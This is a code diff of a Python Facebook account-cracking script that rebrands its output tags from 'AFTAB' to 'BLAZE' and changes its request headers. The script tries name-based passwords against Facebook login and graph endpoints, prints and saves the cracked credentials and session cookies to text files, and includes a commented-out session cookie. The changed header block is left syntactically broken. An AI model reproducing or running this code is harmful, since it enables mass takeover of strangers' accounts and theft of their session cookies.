@@ -1,3 +1,4 @@
+
 #coding=utf-8
 #!/usr/bin/python3
 """
@@ -1209,37 +1210,39 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {
-			'authority': 'm.facebook.com',
-			'method': 'GET',
-			'path': '/login/device-based/login/async/',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding': 'gzip, deflate, br',
-			'accept-language': 'en-US,en;q=0.9',
-			'referer': 'https://x.facebook.com',
-			'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="99", "Chromium";v="105"',
-			'sec-ch-ua-mobile': '?0',
-			'sec-ch-ua-platform': '"Andriod"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'same-origin',
-			'upgrade-insecure-requests': '1',
-			'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;][FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;]"}
-			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
+			header_freefb = {		
+    'authority': 'p.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'sb=OovjY6YnfgL5dZyZF6OBpGuX; datr=3of2ZWlrl_Zf5K6ztbCk_OSj; ps_n=0; ps_l=0; dpr=1.655194878578186; locale=en_GB; vpd=v1%3B707x400x1.655194878578186; wl_cbv=v2%3Bclient_version%3A2446%3Btimestamp%3A1711160153; m_pixel_ratio=1.655194878578186; wd=435x821; fr=0iy2V8QK7dSzGaUUC.AWWEl21Mp7oxddqjCHyB2F5j34g.Bl870q..AAA.0.0.Bl_jub.AWUBgwlef-k',
+    'dpr': '1.8000000715255737',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"M2006C3LI"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
+    'viewport-width': '980',
 			
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[AFTAB-Ok] '+cid+' | '+ps+'\n\033[0;92m[•] COOKIES : '+coki+'\x1b[1;97m')
+				print('\033[1;92m[BLAZE-Ok] '+cid+' | '+ps+'\n\033[0;92m[•] COOKIES : '+coki+'\x1b[1;97m')
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\033[1;96m[AFTAB-CP] '+cid+' | '+ps+'\033[0;97m')
+				print('\033[1;96m[BLAZE-CP] '+cid+' | '+ps+'\033[0;97m')
 				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
 				cps.append(cid)
 				break
@@ -1487,7 +1490,7 @@ def method():
         except:
            last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r \033[1;97m[\033[1;97mAFTAB-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
             heads = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36"
@@ -1509,16 +1512,16 @@ def method():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 print(' \033[1;97m'+cookies)
-                open('/sdcard/PRO-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
+                open('/sdcard/PRO-BLAZE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                 
                 break
             elif 'www.facebook.com' in response.text:
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;97m [AFTAB-CP] '+acc+'| '+pword+'')
+                     print('\r\033[1;97m [BLAZE-CP] '+acc+'| '+pword+'')
                 cpacc.append(acc)
-                open('/sdcard/AFTAB-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/BLAZE-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -1540,10 +1543,10 @@ def method():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r \033[1;97m[\033[1;97mAFTAB-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
-            heads = "Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]"
+            heads = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]"
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
@@ -1551,8 +1554,8 @@ def method():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [AFTAB-Ok] '+acc+'| '+pword+'  ')
-                open('/sdcard/AFTAB-Ok.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m [BLAZE-Ok] '+acc+'| '+pword+'  ')
+                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                  try:  
                   q = json.loads(response.text)
@@ -1566,9 +1569,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;97m [AFTAB-CP] '+acc+'| '+pword)
+                     print('\r\033[1;97m [BLAZE-CP] '+acc+'| '+pword)
                 cpacc.append(acc)
-                open('/sdcard/AFTAB-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/BLAZE-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
